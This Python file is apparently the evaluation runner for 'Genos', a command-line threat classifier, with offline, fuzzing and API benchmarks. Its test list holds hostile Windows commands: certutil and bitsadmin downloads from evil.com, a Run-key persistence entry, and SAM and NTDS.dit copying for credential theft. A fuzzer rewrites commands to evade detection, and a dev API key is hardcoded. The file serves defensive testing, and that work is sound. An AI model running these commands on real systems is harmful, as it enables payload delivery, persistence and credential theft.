import argparse
import json
import os
import random
import re
import time

import pandas as pd
import requests
import torch
import torch.nn as nn
from transformers import RobertaModel, RobertaTokenizer
from tqdm import tqdm

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

DEFAULT_API_URL = "https://l2w3b40t-5000.thundercompute.net/scan"
DEFAULT_API_KEY = "GENOS_DEV_KEY_2026"

TEST_CASES = [
    ("nmap -sS -p 445 192.168.1.0/24", "Network Scanning (Nmap)", "Malicious"),
    ("net view /all /domain", "Domain Share Discovery", "Malicious"),
    ("arp -a", "Local ARP Table Recon", "Malicious"),
    ("netstat -ano | findstr LISTENING", "Port Discovery", "Malicious"),
    ("bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/a.exe C:\\temp\\a.exe", "BITSAdmin Download", "Malicious"),
    ("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Genos /t REG_SZ /d \"C:\\temp\\m.exe\"", "Registry RunKey Persistence", "Malicious"),
    ("certutil.exe -urlcache -split -f http://evil.com/p.exe", "Certutil Payload Download", "Malicious"),
    ("reg save HKLM\\SAM C:\\temp\\sam.save", "SAM Hive Export (Cred Theft)", "Malicious"),
    ("esentutl.exe /y /v /ss C:\\windows\\ntds\\ntds.dit /d C:\\temp\\ntds.dit", "NTDS.dit Copy (AD Dumping)", "Malicious"),
    ("ipconfig /flushdns", "Standard Network Maintenance", "Benign"),
    ("df -h", "Disk Space Check (Linux-style/WSL)", "Benign"),
    ("Get-Service | Where-Object {$_.Status -eq 'Running'}", "PowerShell Service Audit", "Benign"),
    ("echo %COMPUTERNAME%", "Simple Environment Variable Check", "Benign"),
]


class CommandFuzzer:
    @staticmethod
    def random_case(cmd):
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in cmd)

    @staticmethod
    def backtick_injection(cmd):
        words = cmd.split()
        new_words = []
        for word in words:
            if len(word) > 3 and word.isalpha() and random.random() > 0.7:
                idx = random.randint(1, len(word) - 1)
                word = word[:idx] + "`" + word[idx:]
            new_words.append(word)
        return " ".join(new_words)

    @staticmethod
    def path_flip(cmd):
        return cmd.replace("/", "\\") if "/" in cmd else cmd.replace("\\", "/")

    @staticmethod
    def whitespace_chaos(cmd):
        return cmd.replace(" ", "  " if random.random() > 0.5 else "   ")

    @staticmethod
    def env_swap(cmd):
        subs = {
            "c:\\windows\\system32": "%windir%\\system32",
            "c:\\users": "%homedrive%\\users",
            "powershell.exe": "pwsh.exe",
        }
        for k, v in subs.items():
            if k in cmd.lower():
                cmd = re.sub(re.escape(k), lambda _: v, cmd, flags=re.IGNORECASE)
        return cmd

    def apply_cocktail(self, cmd):
        funcs = [
            self.random_case,
            self.backtick_injection,
            self.path_flip,
            self.whitespace_chaos,
            self.env_swap,
        ]
        for func in random.sample(funcs, random.randint(1, 3)):
            cmd = func(cmd)
        return cmd


class GatekeeperModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.encoder = RobertaModel.from_pretrained("microsoft/codebert-base")
        self.classifier = nn.Sequential(
            nn.Dropout(0.2),
            nn.Linear(768, 1024),
            nn.GELU(),
            nn.Dropout(0.2),
            nn.Linear(1024, 2),
        )

    def forward(self, ids, mask):
        out = self.encoder(ids, mask)
        return self.classifier(out.last_hidden_state[:, 0, :])


class SpecialistModel(nn.Module):
    def __init__(self, num_classes):
        super().__init__()
        self.encoder = RobertaModel.from_pretrained("microsoft/codebert-base")
        self.classifier = nn.Sequential(
            nn.Linear(768, 1024),
            nn.LayerNorm(1024),
            nn.GELU(),
            nn.Dropout(0.3),
            nn.Linear(1024, 1024),
            nn.GELU(),
            nn.Linear(1024, num_classes),
        )

    def forward(self, ids, mask):
        out = self.encoder(ids, mask)
        return self.classifier(out.last_hidden_state[:, 0, :])


def normalize(cmd):
    return str(cmd).lower().strip()


def load_models_and_maps(device):
    with open(os.path.join(BASE_DIR, "config", "specialist_map.json"), "r") as f:
        s_map = {int(v): k for k, v in json.load(f).items()}

    t1 = GatekeeperModel().to(device)
    t1.load_state_dict(torch.load(os.path.join(BASE_DIR, "models", "gatekeeper.pt"), map_location=device))

    t2 = SpecialistModel(num_classes=len(s_map)).to(device)
    t2.load_state_dict(torch.load(os.path.join(BASE_DIR, "models", "specialist.pt"), map_location=device))

    t1.eval()
    t2.eval()
    return t1, t2, s_map


def run_offline_audit(sample_size=1000):
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    tokenizer = RobertaTokenizer.from_pretrained("microsoft/codebert-base")
    t1, t2, s_map = load_models_and_maps(device)

    b_df = pd.read_csv(os.path.join(BASE_DIR, "data", "archive", "benign_final.csv")).sample(sample_size)
    m_df = pd.read_csv(os.path.join(BASE_DIR, "data", "archive", "mitre_atlas_raw.csv"))

    print("\n" + "=" * 50 + "\nOFFLINE PIPELINE AUDIT\n" + "=" * 50)

    fps = 0
    for cmd in tqdm(b_df["command"], desc="Checking False Positives"):
        inputs = tokenizer(normalize(cmd), return_tensors="pt", truncation=True, padding="max_length", max_length=96).to(device)
        with torch.no_grad():
            if torch.argmax(t1(inputs["input_ids"], inputs["attention_mask"]), dim=1).item() == 1:
                fps += 1

    hits, exact = 0, 0
    for _, row in tqdm(m_df.iterrows(), total=len(m_df), desc="Checking Attack Attribution"):
        inputs = tokenizer(normalize(row["command"]), return_tensors="pt", truncation=True, padding="max_length", max_length=96).to(device)
        with torch.no_grad():
            if torch.argmax(t1(inputs["input_ids"], inputs["attention_mask"]), dim=1).item() == 1:
                hits += 1
                idx = torch.argmax(t2(inputs["input_ids"], inputs["attention_mask"]), dim=1).item()
                if s_map[idx] == row["mitre_id"]:
                    exact += 1

    print("\n" + "=" * 50)
    print("OFFLINE RESULTS")
    print("=" * 50)
    print(f"False Positive Rate   : {(fps / len(b_df)) * 100:.2f}%")
    print(f"Overall Detection Rate: {(hits / len(m_df)) * 100:.2f}%")
    print(f"MITRE Match Accuracy  : {(exact / hits) * 100:.2f}%" if hits else "MITRE Match Accuracy  : 0.00%")
    print("=" * 50)


def run_fuzzing_audit():
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    tokenizer = RobertaTokenizer.from_pretrained("microsoft/codebert-base")
    t1, t2, s_map = load_models_and_maps(device)
    fuzzer = CommandFuzzer()

    m_df = pd.read_csv(os.path.join(BASE_DIR, "data", "archive", "mitre_atlas_raw.csv"))
    hits, exact = 0, 0

    print("\n" + "!" * 50 + "\nFUZZING RESILIENCE AUDIT\n" + "!" * 50)

    for _, row in tqdm(m_df.iterrows(), total=len(m_df), desc="Attacking the Engine"):
        fuzzed_cmd = fuzzer.apply_cocktail(row["command"])
        actual_mitre = row["mitre_id"]

        inputs = tokenizer(normalize(fuzzed_cmd), return_tensors="pt", truncation=True, padding="max_length", max_length=96).to(device)
        with torch.no_grad():
            if torch.argmax(t1(inputs["input_ids"], inputs["attention_mask"]), dim=1).item() == 1:
                hits += 1
                idx = torch.argmax(t2(inputs["input_ids"], inputs["attention_mask"]), dim=1).item()
                if s_map[idx] == actual_mitre:
                    exact += 1

    print("\n" + "=" * 50)
    print("FUZZING RESULTS")
    print("=" * 50)
    print(f"Overall Detection   : {(hits / len(m_df)) * 100:.2f}%")
    print(f"MITRE Match Accuracy: {(exact / hits) * 100:.2f}%" if hits else "MITRE Match Accuracy: 0.00%")
    print("=" * 50)


def run_api_benchmark(api_url=DEFAULT_API_URL, api_key=DEFAULT_API_KEY, timeout=10):
    print("=" * 80)
    print("GENOS API BENCHMARK")
    print(f"Target: {api_url}")
    print("=" * 80 + "\n")

    passed = 0
    total = len(TEST_CASES)

    for cmd, desc, expected in TEST_CASES:
        payload = {"command": cmd, "api_key": api_key}
        try:
            start_time = time.time()
            response = requests.post(api_url, json=payload, timeout=timeout)
            latency = (time.time() - start_time) * 1000

            data = response.json()
            verdict = data.get("verdict") or data.get("label", "ERROR")
            conf = data.get("confidence") or data.get("label_confidence", 0.0)
            mitre = data.get("mitre_id")
            if mitre is None and isinstance(data.get("MITRE_codes"), list) and data["MITRE_codes"]:
                mitre = data["MITRE_codes"][0].get("code", "N/A")
            if mitre is None:
                mitre = "N/A"

            is_success = verdict == expected
            if is_success:
                passed += 1

            status_char = "PASS" if is_success else "FAIL"
            print(f"[{status_char}] {desc}")
            print(f"  CMD: {cmd}")
            print(f"  Result: {verdict} ({float(conf):.4f}) | MITRE: {mitre} | Latency: {latency:.1f}ms")
            print("-" * 60)

        except Exception as exc:
            print(f"[FAIL] Error testing '{desc}': {exc}")

    print("\n" + "=" * 80)
    print(f"FINAL SCORE: {passed}/{total} ({(passed / total) * 100:.2f}%)")
    print("=" * 80)


def parse_args():
    parser = argparse.ArgumentParser(description="Unified Genos eval runner")
    parser.add_argument(
        "--mode",
        choices=["all", "offline", "fuzz", "api"],
        default="all",
        help="Eval mode to run",
    )
    parser.add_argument("--sample-size", type=int, default=1000, help="Benign sample size for offline audit")
    parser.add_argument("--api-url", default=DEFAULT_API_URL, help="API endpoint for API benchmark")
    parser.add_argument("--api-key", default=DEFAULT_API_KEY, help="API key for API benchmark")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds for API benchmark")
    return parser.parse_args()


def main():
    args = parse_args()
    if args.mode in ("all", "offline"):
        run_offline_audit(sample_size=args.sample_size)
    if args.mode in ("all", "fuzz"):
        run_fuzzing_audit()
    if args.mode in ("all", "api"):
        run_api_benchmark(api_url=args.api_url, api_key=args.api_key, timeout=args.timeout)


if __name__ == "__main__":
    main()